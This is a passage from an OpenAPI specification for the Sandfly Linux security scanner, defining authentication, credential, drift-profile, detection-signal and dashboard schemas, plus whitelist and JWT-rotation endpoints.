              schema:
                $ref: "#/components/schemas/StandardResponse"
          description: Sandfly not found.
        default:
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StandardResponse"
          description: Unexpected error
      tags:
        - Whitelist
  /whitelistrulesDelete:
    post:
      operationId: deleteWhitelistRules
      description: Bulk deletes whitelist rules.
      requestBody:
        content:
          application/json:
            schema:
              $ref: "#/components/schemas/WhitelistRulesDelete"
        description: Whitelist rules delete config.
        required: true
      responses:
        "200":
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StandardResponse"
          description: Whitelists successfully deleted.
        "400":
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StandardResponse"
          description: Invalid whitelist rules delete request.
        default:
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StandardResponse"
          description: Unexpected error
      summary: Delete Whitelist Rules
      tags:
        - Whitelist
  /debug/rotatejwtkey:
    post:
      description: Generates a new JWT signing key and saves it to the database. This invalidates all existing user sessions, requiring users to log in again. The new key takes effect immediately.
      operationId: rotateJwtKey
      responses:
        "200":
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StandardResponse"
          description: JWT signing key rotated successfully.
        "500":
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StandardResponse"
          description: Failed to rotate JWT signing key.
        default:
          content:
            application/json:
              schema:
                $ref: "#/components/schemas/StandardResponse"
          description: Unexpected error
      summary: Rotate JWT Signing Key
      tags:
        - Debug
components:
  parameters:
    summary:
      description: Data returned in summary form. If true, only the most important data is returned in a flattened format. If false, all data is returned.
      in: query
      name: summary
      required: false
      schema:
        type: boolean
    include_system:
      description: If true, data returned include system only data types typically not intended for end user use.
      in: query
      name: summary
      required: false
      schema:
        type: boolean
  schemas:
    AuditLogEntry:
      required:
        - id
        - ip_addr
        - message
        - record_type
        - timestamp
        - username
      properties:
        id:
          type: string
          description: ID of this audit log entry.
        ip_addr:
          type: string
          description: IP address of the source of the request that this log message pertains to.
        message:
          type: string
          description: Audit log message.
        record_type:
          type: string
          description: Type of entry.
        timestamp:
          type: string
          description: Time the activity occurred.
        username:
          type: string
          description: Username (or, if internally triggered by the Sandfly API service, '[system]') that triggered this event.
      type: object
    AuthAccess:
      description: Response returned on successful login.
      allOf:
        - $ref: "#/components/schemas/AuthAccessToken"
    AuthAccessFull:
      description: Response returned on successful login when full_details is true in the request.
      allOf:
        - $ref: "#/components/schemas/AuthAccessData"
        - $ref: "#/components/schemas/AuthAccessToken"
    AuthAccessRefresh:
      description: Response returned on successful API login.
      allOf:
        - $ref: "#/components/schemas/AuthAccessToken"
        - $ref: "#/components/schemas/AuthRefreshToken"
    AuthAccessRefreshFull:
      description: Response returned on successful API login when full_details is true in the request.
      allOf:
        - $ref: "#/components/schemas/AuthAccessData"
        - $ref: "#/components/schemas/AuthAccessToken"
        - $ref: "#/components/schemas/AuthRefreshToken"
        - $ref: "#/components/schemas/AuthRefreshData"
    AuthAccessToken:
      required:
        - access_token
      readOnly: true
      properties:
        access_token:
          description: Access token
          type: string
      type: object
    AuthAccessData:
      description: Extended data returned on login when full_details is true.
      readOnly: true
      required:
        - access_token_data
        - access_token_expire_date
        - access_token_issue_date
        - session_expiration_date
        - user
        - llm
        - response_actions
        - saved_views
      type: object
      properties:
        access_token_data:
          $ref: "#/components/schemas/JWT"
          description: Access JWT data decoded.
          type: object
        access_token_expire_date:
          description: Access token expire date.
          type: string
          format: date-time
        access_token_issue_date:
          description: Access token issue date.
          type: string
          format: date-time
        session_expiration_date:
          description: Time after which session cannot be refreshed.
          type: string
          format: date-time
        user:
          $ref: "#/components/schemas/User"
        license:
          $ref: "#/components/schemas/License"
        llm:
          description: Current LLM configuration
          $ref: "#/components/schemas/LlmLoginInfo"
        response_actions:
          description: Current response actions configuration
          $ref: "#/components/schemas/ResponseActionsLoginInfo"
        saved_views:
          type: array
          items:
            $ref: "#/components/schemas/SavedView"
    AuthRefreshToken:
      required:
        - refresh_token
      readOnly: true
      properties:
        refresh_token:
          description: Refresh token
          type: string
      type: object
    AuthRefreshData:
      description: Extended data returned on token refresh when full_details is true.
      readOnly: true
      required:
        - refresh_token
        - refresh_token_data
        - refresh_token_expire_date
        - refresh_token_issue_date
      properties:
        refresh_token:
          description: Refresh token.
          type: string
        refresh_token_data:
          $ref: "#/components/schemas/JWT"
          description: Refresh JWT data decoded.
          type: object
        refresh_token_expire_date:
          description: Refresh token expire date.
          type: string
        refresh_token_issue_date:
          description: Refresh token issue date.
          type: string
      type: object
    AuthLogin:
      properties:
        full_details:
          description: Get full details of issued token.
          type: boolean
        password:
          description: Password string.
          format: password
          type: string
        username:
          description: Username string.
          type: string
      type: object
    AuthLoginRefresh:
      properties:
        full_details:
          description: Get full details of issued token.
          nullable: true
          type: boolean
      type: object
    AuthLogout:
      type: object
    AutoDriftCreateRequest:
      type: object
      properties:
        name:
          type: string
          description: The name of the auto-drift result profile.
        description:
          type: string
          description: A description of the auto-drift result profile.
        user_note:
          type: string
          description: A user-provided note to record in the profile's history log.
        scope:
          $ref: "#/components/schemas/ProfileAutoScope"
        model_hosts:
          description: The hosts to use as the model (i.e. template) hosts for expected results.
          $ref: "#/components/schemas/ProfileAutoHosts"
        covered_hosts:
          description: The hosts that this profile should detect drift on (and optionally whitelist) after the results from the model host(s) are gathered.
          $ref: "#/components/schemas/ProfileAutoHosts"
        gather_options:
          description: When present, this profile will enter gather mode and run gather schedules as configured. If null, no gather schedule will be created and the profile will immediately enter enforcing mode.
          nullable: true
          $ref: "#/components/schemas/ProfileGatherOptions"
        schedule_options:
          description: When present, the new profile will automatically have a scan schedule associated with it that scans the covered hosts with the selected sandflies for drift detection. If null, no scan schedule will be created.
          nullable: true
          $ref: "#/components/schemas/ProfileScheduleOptions"
      required:
        - name
        - scope
        - model_hosts
        - covered_hosts
        - gather_options
        - schedule_options
    AutoDriftEditRequest:
      type: object
      properties:
        name:
          type: string
          description: The name of the auto-drift result profile. If null or an empty string, the name will remain unchanged.
          nullable: true
        description:
          type: string
          description: A description of the auto-drift result profile. If null, will not change the existing description. If an empty string, will erase the existing description.
          nullable: true
        user_note:
          type: string
          description: A user-provided note to record in the profile's history log.
          nullable: true
        scope:
          $ref: "#/components/schemas/ProfileAutoScope"
          nullable: true
        model_hosts:
          description: The hosts to use as the model (i.e. template) hosts for expected results.
          $ref: "#/components/schemas/ProfileAutoHosts"
          nullable: true
        covered_hosts:
          description: The hosts that this profile should detect drift on (and optionally whitelist) after the results from the model host(s) are gathered.
          $ref: "#/components/schemas/ProfileAutoHosts"
          nullable: true
        gather_options:
          description: When present, this profile will enter gather mode and run gather schedules as configured. If null, no gather schedule will be created and the profile will immediately enter enforcing mode.
          nullable: true
          $ref: "#/components/schemas/ProfileGatherOptions"
        schedule_options:
          description: When present, the new profile will automatically have a scan schedule associated with it that scans the covered hosts with the selected sandflies for drift detection. If null, no scan schedule will be created.
          nullable: true
          $ref: "#/components/schemas/ProfileScheduleOptions"
      required:
        - name
        - scope
        - model_hosts
        - covered_hosts
        - gather_options
        - schedule_options
    AutoDriftAutoAppendRequest:
      type: object
      properties:
        user_note:
          type: string
          description: User-provided descriptive note explaining the results that are being added. (Optional)
    CredentialConfiguration:
      required:
        - credentials_type
      description: This is how we insert credentials for a target system. When inserted, they are encrypted and stored by the system. Also used by ad hoc scan for one time use credentials.
      properties:
        credentials_type:
          $ref: "#/components/schemas/CredentialsType"
        external_ca_cert_b64:
          description: If an external credential type, base64-encoded trusted root CA certificate for the credential provider service, if necessary.
          type: string
        external_extra_data:
          description: If an external credential type, extra data to provide to the credential provider service.
          type: string
        external_unique_per_host:
          description: If an external credential type, does the provider provide a unique credential per target host?
          type: boolean
        external_url:
          description: If an external credential type, the URL of the credential provider service.
          type: string
        password:
          description: This is the password we can use to login if using username credentials or needed for sudo.
          type: string
        ssh_key_b64:
          description: The ssh_key we can use to login that is base 64 encoded.
          type: string
        ssh_key_certificate_b64:
          description: The ssh_key_certificate if using SSH CA signed credentials.
          type: string
        ssh_key_password:
          description: This is the password used to decrypt the ssh_key if we have one.
          type: string
        username:
          description: This is the username we can use to login.
          type: string
        ima_signing_key_b64:
          description: Base64-encoded PKCS#1, PKCS#8, or encrypted PKCS#8 PEM-format RSA private key. If present on a credential, when the credential is used to connect to a host, Sandfly will add an IMA signature to the scanning binary on the target host using this private key.
          type: string
        ima_signing_key_password:
          description: If ima_signing_key_b64 contains an encrypted PKCS#8 private key, this password will be used to decrypt it. Do not set this property if ima_signing_key_b64 is empty.
          type: string
      type: object
    CredentialsDelete:
      properties:
        credential_ids:
          description: List of credential_ids to delete.
          items:
            type: string
          type: array
      type: object
    CredentialsHostEncrypted:
      description: This holds public key encrypted login credentials for target systems.
      properties:
        credentials_data:
          description: Encrypted credentials in base64 format for use by scanning nodes to authenticate to target.
          type: string
        credentials_id:
          description: The name of this encrypted credential
          type: string
        credentials_type:
          $ref: "#/components/schemas/CredentialsType"
        external_ca_cert_b64:
          description: If an external credential type, base64-encoded trusted root CA certificate for the credential provider service, if necessary.
          type: string
        external_extra_data:
          description: If an external credential type, extra data to provide to the credential provider service.
          type: string
        external_unique_per_host:
          description: If an external credential type, does the provider provide a unique credential per target host?
          type: boolean
        external_url:
          description: If an external credential type, the URL of the credential provider service.
          type: string
        generated:
          description: Indicates that this credential was generated by Sandfly.
          type: boolean
        host_count:
          description: The number of hosts in Sandfly assigned to this credential.
          format: int32
          type: integer
        id:
          description: The name of this encrypted credential
          type: string
          deprecated: false
        public_key:
          description: If this credential was generated by Sandfly, this is the public key to add to a host's authorized_keys file to allow Sandfly to connect with this credential.
          type: string
        ima_key_present:
          description: Indicates that this credential contains an IMA signing key and Sandfly will attempt to sign the scanning binary on target hosts that use this credential.
          type: boolean
          readOnly: true
      required:
        - id
        - credentials_id
        - credentials_type
        - credentials_data
        - generated
        - host_count
      type: object
    CredentialsType:
      description: Supported Credential Types.
      type: string
      enum:
        - ssh_key
        - username
        - external
        - ssh_generate_ed25519
        - ssh_generate_rsa4096
        - ssh_generate_rsa8192
    CronSignal:
      type: string
      title: CronSignal
      description: Findings from a scheduled cron entry.
      enum:
        - runs-at-boot
        - non-utf8-crontab
      x-enumDescriptions:
        runs-at-boot: The entry runs on every boot, a common way to stay installed.
        non-utf8-crontab: The crontab contains invalid text, which can hide entries or signal tampering.
      x-enumSeverities:
        runs-at-boot: 5
        non-utf8-crontab: 4
    CronSource:
      type: string
      title: CronSource
      description: Where a cron entry was found.
      enum:
        - user-crontab
        - system-crontab
        - cron-d-drop-in
        - run-parts-drop-in
      x-enumDescriptions:
        user-crontab: A crontab belonging to a single user.
        system-crontab: The system-wide crontab, which names the user each entry runs as.
        cron-d-drop-in: A drop-in file under /etc/cron.d.
        run-parts-drop-in: A script run from an hourly, daily, weekly or monthly cron directory.
    CronTimeMacro:
      type: string
      title: CronTimeMacro
      description: Shorthand schedules a cron entry can use instead of a full timetable.
      enum:
        - "@reboot"
        - "@yearly"
        - "@annually"
        - "@monthly"
        - "@weekly"
        - "@daily"
        - "@midnight"
        - "@hourly"
      x-enumDescriptions:
        "@reboot": Runs at every boot.
        "@yearly": Runs once a year.
        "@annually": Runs once a year.
        "@monthly": Runs once a month.
        "@weekly": Runs once a week.
        "@daily": Runs once a day.
        "@midnight": Runs once a day at midnight.
        "@hourly": Runs once an hour.
    DashboardData:
      type: object
      required:
        - period
        - hosts
        - results
        - alert_hosts
        - alert_hosts_count
        - artifacts
        - ssh_zone_violations
        - ssh_zone_violations_count
        - ssh_zones_count
        - ssh_active_keys_count
        - ssh_active_users_count
        - ssh_active_hosts_count
        - new_ssh_keys
        - new_ssh_keys_count
        - host_distributions
        - host_kernels
        - tactics
      properties:
        period:
          type: object
          required:
            - start_time
            - end_time
          description: Time period that time-sequence data covers (will always be -72 hours from now to now).
          properties:
            start_time:
              type: string
              format: date-time
            end_time:
              type: string
              format: date-time
        hosts:
          type: object
          description: Count of hosts in system.
          required:
            - total
            - total_active
            - total_inactive
          properties:
            total:
              type: integer
            total_active:
              type: integer
            total_inactive:
              type: integer
        results:
          required:
            - hourly
          properties:
            hourly:
              required:
                - alert
                - pass
                - error
                - all
              properties:
                alert:
                  $ref: "#/components/schemas/StandardTimeBasedGraphData"
                pass:
                  $ref: "#/components/schemas/StandardTimeBasedGraphData"
                error:
                  $ref: "#/components/schemas/StandardTimeBasedGraphData"
                all:
                  $ref: "#/components/schemas/StandardTimeBasedGraphData"
        alert_hosts:
          type: array
          description: Top 5 hosts that have alerts.
          items:
            $ref: "#/components/schemas/DashboardHostSummary"
        alert_hosts_count:
          type: integer
          description: Total number of hosts with alerts, including those listed in alert_hosts.
        artifacts:
          type: object
          description: Artifact-centric summary of what is currently alerting across all hosts. Every count covers live artifacts only (superseded copies are history), the same set the /v4/artifacts endpoints work over. These counts are cached and can be a few seconds behind on a system being actively scanned (usually no more than 10 seconds out of date).
          required:
            - alert_hosts_count
            - alerts
            - distinct_alerts
          properties:
            alert_hosts_count:
              type: integer
              description: Number of hosts with one or more alerting artifacts. This is not the same number as the top-level alert_hosts_count, which counts hosts by their per-sandfly result counts and includes superseded results.
            alerts:
              type: integer
              description: Number of alerting artifacts across those hosts.
            distinct_alerts:
              type: object
              description: Number of alerting artifacts with cross-host duplicates collapsed, by each of the two match hash tiers the artifact API compares artifacts across hosts with (see ArtifactHostCounts). An alerting artifact with no hash for a tier has no cross-host identity to group it by, so it counts as one distinct artifact of its own in that tier.
              required:
                - permissive
                - moderate
              properties:
                permissive:
                  type: integer
                  description: Distinct alerting artifacts by permissive match hash, which groups the same artifact wherever it is found.
                moderate:
                  type: integer
                  description: Distinct alerting artifacts by moderate match hash, which keeps copies that differ in more than their location apart, so this number is the higher of the two.
        ssh_zone_violations:
          type: array
          description: Top 5 SSH security zones that have violations.
          items:
            $ref: "#/components/schemas/SSHZoneSummary"
        ssh_zone_violations_count:
          type: integer
          description: Total number of SSH security zones that have violations.
        ssh_zones_count:
          type: integer
          description: Total number of SSH security zones configured.
        ssh_active_keys_count:
          type: integer
          description: Total number of unique active SSH keys across all hosts.
        ssh_active_users_count:
          type: integer
          description: Total number of unique usernames with active SSH keys across all hosts.
        ssh_active_hosts_count:
          type: integer
          description: Total number of hosts with active SSH keys.
        new_ssh_keys:
          type: array
          description: Newest 5 SSH keys that were first seen in the last 72 hours.
          items:
            $ref: "#/components/schemas/DashboardSSHKeySummary"
        new_ssh_keys_count:
          type: integer
          description: Total number of new SSH keys in the last 72 hours, including those listed in new_ssh_keys.
        host_distributions:
          type: array
          description: Count of OS distributions across hosts.
          items:
            type: object
            required:
              - name
              - count
            properties:
              name:
                type: string
                description: Distribution name
              count:
                type: integer
                description: Number of hosts with this distribution.
        host_kernels:
          type: array
          description: Count of kernel versions across hosts.
          items:
            type: object
            required:
              - name
              - count
            properties:
              name:
                type: string
                description: Kernel name
              count:
                type: integer
                description: Number of hosts with this kernel.
        tactics:
          type: array
          description: Count of alerts for each MITRE ATT&CK tactic seen over the last 72 hours.
          items:
            type: object
            required:
              - name
              - count
            properties:
              name:
                type: string
                description: Tactic tag name
              count:
                type: integer
                description: Number of alerts.
    DashboardHostSummary:
      type: object
      required:
        - host_id
        - host_sequence_id
        - os_info_os_release_pretty_name
        - os_info_node
        - tags
        - alerts
      properties:
        host_id:
          type: string
          description: Host ID.
        host_sequence_id:
          type: integer
          description: Host sequence ID.
        os_info_os_release_pretty_name:
          type: string
          description: Host OS distribution release name.
        os_info_node:
          type: string
          description: Host node name.
        tags:
          type: array
          items:
            type: string
          description: Host tags.
        alerts:
          type: integer
          description: Number of current (not superseded) alert results on the host.
    DashboardSSHKeySummary:
      type: object
      properties:
        id:
          type: integer
          description: ID of the SSH key.
        friendly_name:
          type: string
          description: Friendly name of the SSH key.
        first_seen:
          type: string
          format: date-time
          description: Date and time this key was first seen across the network.
        hosts:
          type: array
          description: Up to two hosts that this new key has appeared on.
          items:
            $ref: "#/components/schemas/DashboardHostSummary"
        more_hosts:
          type: boolean
          description: Is this key on more than just the hosts listed in the hosts property?
    DashboardV2Data:
      type: object
      description: Dashboard data. The hourly scan activity and the new SSH keys cover the requested period; every other value is the state now.
      required:
        - generated_at
        - period
        - alerts
        - top_alerting_hosts
        - threat_hosts
        - hosts
        - ssh_zones
        - ssh_keys
        - coverage
        - hourly
      properties:
        generated_at:
          type: string
          format: date-time
          description: When the data was returned.
        period:
          $ref: "#/components/schemas/DashboardV2Period"
        alerts:
          $ref: "#/components/schemas/DashboardV2Alerts"
        top_alerting_hosts:
          type: array
          items:
            $ref: "#/components/schemas/DashboardV2AlertHost"
          description: The hosts with the most severity 4 and 5 alerts, then the most alerts. Up to 6 hosts.
        threat_hosts:
          $ref: "#/components/schemas/DashboardV2ThreatHosts"
        hosts:
          $ref: "#/components/schemas/DashboardV2Hosts"
        ssh_zones:
          $ref: "#/components/schemas/DashboardV2SSHZones"
        ssh_keys:
          $ref: "#/components/schemas/DashboardV2SSHKeys"
        coverage:
          $ref: "#/components/schemas/DashboardV2Coverage"
        hourly:
          type: array
          items:
            $ref: "#/components/schemas/DashboardV2Hour"
          description: Scan activity for each UTC hour in the period, oldest first. The first hour starts at the period's start time and the last hour is the current hour so far, so the counts add up to the whole period. The hours do not go back further than history_start. While the server is still catching up on scan history, such as just after an upgrade, hours older than a day that it has not reached yet are left out.
    DashboardV2Period:
      type: object
      description: The period the dashboard covers.
      required:
        - hours
        - start_time
        - end_time
        - history_start
      properties:
        hours:
          type: integer
          description: Length of the period in hours, as requested.
        start_time:
          type: string
          format: date-time
          description: Start of the period.
        end_time:
          type: string
          format: date-time
          description: End of the period.
        history_start:
          type: string
          format: date-time
          nullable: true
          description: Start of the oldest hour of scan activity the server has. A period that starts before this has no scan activity for its earlier hours. Null if no host has been scanned yet. How far back scan activity goes is set by scan_log_retention_days.
    DashboardV2SeverityCounts:
      type: object
      description: Counts of alerting artifacts by severity, 1 to 5.
      required:
        - "1"
        - "2"
        - "3"
        - "4"
        - "5"
      properties:
        "1":
          type: integer
          description: Number of alerting artifacts with severity 1.
        "2":
          type: integer
          description: Number of alerting artifacts with severity 2.
        "3":
          type: integer
          description: Number of alerting artifacts with severity 3.
        "4":
          type: integer
          description: Number of alerting artifacts with severity 4.
        "5":
          type: integer
          description: Number of alerting artifacts with severity 5.
    DashboardV2Alerts:
      type: object
      description: "Open alerts: alerting artifacts on hosts that have not been deleted."
      required:
        - open
        - hosts
        - by_severity
      properties:
        open:
          type: integer
          description: Number of alerting artifacts.
        hosts:
          type: integer
          description: Number of hosts with at least one alerting artifact.
        by_severity:
          $ref: "#/components/schemas/DashboardV2SeverityCounts"
    DashboardV2AlertHost:
      type: object
      description: A host with open alerts.
      required:
        - host_id
        - host_sequence_id
        - node_name
        - target_address
        - last_seen_ip_addr
        - alerts
        - by_severity
      properties:
        host_id:
          type: string
          description: Host ID.
        host_sequence_id:
          type: integer
          description: Host sequence ID.
        node_name:
          type: string
          description: Host node name.
        target_address:
          type: string
          description: Address used to connect to the host.
        last_seen_ip_addr:
          type: string
          description: IP address the host was last seen at.
        alerts:
          type: integer
          description: Number of alerting artifacts on the host.
        by_severity:
          $ref: "#/components/schemas/DashboardV2SeverityCounts"
    DashboardV2ThreatHosts:
      type: object
      description: "Hosts that AI triage judged a threat: hosts with a likely_malicious or likely_compromised verdict, or a verdict that rated the host severity 4 or 5 where that rating still applies. A rating no longer applies after it is reverted, or once the host's alerts change."
      required:
        - triage_enabled
        - hosts
        - by_tag
        - other
        - untagged
      properties:
        triage_enabled:
          type: boolean
          description: True if AI triage is enabled.
        hosts:
          type: integer
          description: Number of threat hosts.
        by_tag:
          type: array
          items:
            $ref: "#/components/schemas/DashboardV2TagCount"
          description: The host tags on the most threat hosts, most first. Up to 4 tags. A host with several tags counts once for each.
        other:
          $ref: "#/components/schemas/DashboardV2TagOther"
        untagged:
          type: integer
          description: Number of threat hosts without a tag.
    DashboardV2TagCount:
      type: object
      description: How many hosts have a tag.
      required:
        - tag
        - hosts
      properties:
        tag:
          type: string
          description: Host tag.
        hosts:
          type: integer
          description: Number of hosts with the tag.
    DashboardV2TagOther:
      type: object
      description: The tags not included in a list.
      required:
        - tags
        - hosts
      properties:
        tags:
          type: integer
          description: Number of tags not included.
        hosts:
          type: integer
          description: Number of hosts with at least one of those tags.
    DashboardV2Hosts:
      type: object
      description: Summary of the hosts that have not been deleted.
      required:
        - total
        - active
        - online
        - os
        - os_other
        - os_unknown
        - arch
      properties:
        total:
          type: integer
          description: Number of hosts.
        active:
          type: integer
          description: "Number of active hosts: hosts that were added successfully. Hosts whose add failed are not active."
        online:
          type: integer
          description: Number of hosts seen in the last 24 hours.
        os:
          type: array
          items:
            $ref: "#/components/schemas/DashboardV2OSCount"
          description: The operating system versions on the most hosts, most first. Up to 3 versions.
        os_other:
          $ref: "#/components/schemas/DashboardV2OSOther"
        os_unknown:
          type: integer
          description: Number of hosts whose operating system is not known yet, such as hosts that have not been scanned.
        arch:
          type: array
          items:
            $ref: "#/components/schemas/DashboardV2ArchCount"
          description: Hosts by architecture, most first. Hosts whose architecture is not known are not included.
    DashboardV2OSCount:
      type: object
      description: How many hosts run an operating system version.
      required:
        - name
        - version
        - hosts
      properties:
        name:
          type: string
          description: Operating system release name.
        version:
          type: string
          description: Major version, or major.minor version, from the release version. For example, 22.04 for release version 22.04.5 LTS. Empty if the release has no version number.
        hosts:
          type: integer
          description: Number of hosts.
    DashboardV2OSOther:
      type: object
      description: The operating system versions not included in a list.
      required:
        - versions
        - hosts
      properties:
        versions:
          type: integer
          description: Number of versions not included.
        hosts:
          type: integer
          description: Number of hosts that run one of those versions.
    DashboardV2ArchCount:
      type: object
      description: How many hosts have an architecture.
      required:
        - arch
        - hosts
      properties:
        arch:
          type: string
          description: Architecture, for example x86_64 or aarch64.
        hosts:
          type: integer
          description: Number of hosts.
    DashboardV2SSHZones:
      type: object
      description: Summary of the SSH zones.
      required:
        - zones
        - zones_with_violations
        - hosts_with_violations
        - hosts_with_banned_keys
        - hosts_with_any_violation
        - top
        - other
      properties:
        zones:
          type: integer
          description: Number of SSH zones.
        zones_with_violations:
          type: integer
          description: Number of zones with at least one host with a violation or a banned key.
        hosts_with_violations:
          type: integer
          description: Number of hosts in any zone with an SSH key that none of the host's zones permit. A host in several zones counts once.
        hosts_with_banned_keys:
          type: integer
          description: Number of hosts in any zone with a banned SSH key. A host in several zones counts once.
        hosts_with_any_violation:
          type: integer
          description: Number of hosts in any zone with a violation, a banned SSH key or both. A host counts once, where adding hosts_with_violations and hosts_with_banned_keys counts a host with both twice.
        top:
          type: array
          items:
            $ref: "#/components/schemas/DashboardV2SSHZone"
          description: The zones with the most hosts with violations or banned keys, then the most hosts. Up to 5 zones.
        other:
          $ref: "#/components/schemas/DashboardV2SSHZoneOther"
    DashboardV2SSHZone:
      type: object
      description: An SSH zone.
      required:
        - id
        - name
        - hosts
        - permitted_keys
        - users
        - hosts_with_violations
        - hosts_with_banned_keys
      properties:
        id:
          type: integer
          description: SSH zone ID.
        name:
          type: string
          description: SSH zone name.
        hosts:
          type: integer
          description: Number of hosts in the zone.
        permitted_keys:
          type: integer
          description: Number of SSH keys the zone permits.
        users:
          type: integer
          description: Number of users with an SSH key that allows login to a host in the zone.
        hosts_with_violations:
          type: integer
          description: Number of hosts in the zone with an SSH key that none of the host's zones permit. A key this zone does not permit is not a violation on a host that is also in a zone that permits it.
        hosts_with_banned_keys:
          type: integer
          description: Number of hosts in the zone with a banned SSH key.
    DashboardV2SSHZoneOther:
      type: object
      description: The SSH zones not included in a list. A host, key or user in several of them counts once for each.
      required:
        - zones
        - hosts
        - permitted_keys
        - users
        - hosts_with_violations
        - hosts_with_banned_keys
      properties:
        zones:
          type: integer
          description: Number of zones not included.
        hosts:
          type: integer
          description: Number of hosts in those zones.
        permitted_keys:
          type: integer
          description: Number of SSH keys those zones permit.
        users:
          type: integer
          description: Number of users with an SSH key that allows login to a host in those zones.
        hosts_with_violations:
          type: integer
          description: Number of hosts in those zones with an SSH key that none of the host's zones permit.
        hosts_with_banned_keys:
          type: integer
          description: Number of hosts in those zones with a banned SSH key.
    DashboardV2SSHKeys:
      type: object
      description: Summary of the SSH keys that allow login to hosts, and the keys first seen in the period.
      required:
        - active
        - banned
        - usernames
        - new
        - new_keys
        - new_other
      properties:
        active:
          type: integer
          description: Number of SSH keys that allow login to at least one host.
        banned:
          type: integer
          description: Number of banned SSH keys that allow login to at least one host.
        usernames:
          type: integer
          description: Number of different usernames that SSH keys allow login as, on any host. A username on several hosts counts once.
        new:
          type: integer
          description: Number of SSH keys first seen in the period.
        new_keys:
          type: array
          items:
            $ref: "#/components/schemas/DashboardV2NewSSHKey"
          description: The SSH keys first seen most recently in the period, newest first. Up to 4 keys.
        new_other:
          $ref: "#/components/schemas/DashboardV2NewSSHOther"
    DashboardV2NewSSHKey:
      type: object
      description: An SSH key first seen in the period.
      required:
        - id
        - friendly_name
        - sha256_fingerprint
        - banned
        - first_seen
        - host_id
        - host_sequence_id
        - node_name
        - username
        - hosts
        - users
      properties:
        id:
          type: integer
          description: SSH key ID.
        friendly_name:
          type: string
          description: SSH key friendly name.
        sha256_fingerprint:
          type: string
          description: SSH key SHA256 fingerprint.
        banned:
          type: boolean
          description: True if the key is banned.
        first_seen:
          type: string
          format: date-time
          description: When the key was first seen.
        host_id:
          type: string
          description: ID of the host the key was first seen on. Empty if that host was deleted.
        host_sequence_id:
          type: integer
          description: Sequence ID of the host the key was first seen on. 0 if that host was deleted.
        node_name:
          type: string
          description: Node name of the host the key was first seen on.
        username:
          type: string
          description: User the key was first seen for.
        hosts:
          type: integer
          description: Number of hosts the key allows login to now.
        users:
          type: integer
          description: Number of users the key allows login as now.
    DashboardV2NewSSHOther:
      type: object
      description: The new SSH keys not included in a list.
      required:
        - keys
        - hosts
        - users
      properties:
        keys:
          type: integer
          description: Number of keys not included.
        hosts:
          type: integer
          description: Number of hosts those keys allow login to now.
        users:
          type: integer
          description: Number of users those keys allow login as now.
    DashboardV2Coverage:
      type: object
      description: What was scanned in the last 24 hours. Divide hosts_scanned_24h by hosts.active for the share of hosts scanned.
      required:
        - hosts_scanned_24h
        - sandflies_run_24h
        - sandflies_active
      properties:
        hosts_scanned_24h:
          type: integer
          description: Number of hosts scanned in the last 24 hours.
        sandflies_run_24h:
          type: integer
          description: Number of active sandflies that ran in the last 24 hours, to the hour.
        sandflies_active:
          type: integer
          description: Number of active sandflies.
    DashboardV2Hour:
      type: object
      description: Scan activity in one UTC hour. Every count except hosts_alerting can be added up across hours, for example to make daily totals in a local time zone.
      required:
        - time
        - host_scans
        - scan_errors
        - artifacts
        - results
        - hosts_alerting
      properties:
        time:
          type: string
          format: date-time
          description: Start of the hour.
        host_scans:
          type: integer
          description: Number of host scans whose results the server received in the hour. This is when the results reached the server, not when the scan ran on the host, so a backlog of results waiting to be received shows up in the hour they are received. A host scanned twice counts twice.
        scan_errors:
          type: integer
          description: Number of host scans whose failure the server received in the hour.
        artifacts:
          type: integer
          format: int64
          nullable: true
          description: Number of artifacts the nodes sent back for the hour's scans, before the server combined them for storage. Null for hours before this count was recorded.
        results:
          $ref: "#/components/schemas/DashboardV2ResultCounts"
        hosts_alerting:
          type: integer
          nullable: true
          description: "Number of hosts with open alerts at the end of the hour. This is a level, not a count of the hour's activity, so do not add it up across hours. For the current hour, it is the number of hosts with open alerts now. Null for hours the server did not record it: hours from before the server was upgraded to a version that records it, and hours that ended while the server was not running."
    DashboardV2ResultCounts:
      type: object
      description: Counts of the results of the hour's scans.
      required:
        - pass
        - alert
        - error
      properties:
        pass:
          type: integer
          format: int64
          description: Number of sandflies that ran without finding anything.
        alert:
          type: integer
          format: int64
          description: Number of alert results.
        error:
          type: integer
          format: int64
          description: Number of sandfly error results.
    DeletedData:
      enum:
        - "[deleted]"
    DirectorySignal:
      type: string
      title: DirectorySignal
      description: Findings from a directory.
      enum:
        - count-mismatch
        - cloaked-entry
        - world-writable-without-sticky
      x-enumDescriptions:
        count-mismatch: The directory holds more entries than it reports, a sign that files are being hidden.
        cloaked-entry: An entry hidden from normal directory listings, a common rootkit technique.
        world-writable-without-sticky: Any user can delete or replace another user's files in this directory.
      x-enumSeverities:
        count-mismatch: 5
        cloaked-entry: 5
        world-writable-without-sticky: 5
    EmailAlertsConfig:
      required:
        - mail_password
      allOf:
        - $ref: "#/components/schemas/EmailAlert"
      properties:
        mail_password:
          description: Password used with this email entry.
          type: string
      type: object
    EmailAlert:
      type: object
      required:
        - name
        - email_recipients
        - email_sender
        - mail_server
        - mail_port
        - mail_username
      properties:
        name:
          type: string
          description: Human friendly name for the email alert.
        email_recipients:
          type: array
          description: Emails of those who will receive this alert.
          uniqueItems: true
          items:
            type: string
            format: email
        email_sender:
          type: string
          format: email
          description: Email that will appear as the sender of the alert.
        mail_server:
          type: string
          format: uri
          description: hostname or IP address for the SMTP server.
        mail_port:
          type: integer
          description: SMTP server port
          format: int32
          default: 587
        mail_username:
          type: string
          description: Username credential for the mail server.
    EmailUpdate:
      properties:
        email_recipients:
          description: Array format of single or multiple e-mail addresses where alerts should be sent.
          items:
            type: string
            format: email
          type: array
        email_sender:
          description: email address of the person sending the e-mail.
          type: string
          format: email
        mail_password:
          description: Password used with this email entry. If this property is not present or is null, the existing password is not changed.
          type: string
        mail_port:
          description: SMTP server port
          type: integer
        mail_server:
          description: hostname or IP address for the SMTP server.
          type: string
        mail_username:
          description: Username used with this email entry. If this property is not present or is null, the existing username is not changed.
          type: string
      required:
        - email_recipients
        - email_sender
        - mail_server
        - mail_port
      type: object
    ErrorLog:
      properties:
        data:
          description: Error log entries.
          oneOf:
            - items:
                $ref: "#/components/schemas/ErrorLogEntry"
              type: array
            - items:
                $ref: "#/components/schemas/ErrorLogSummaryEntry"
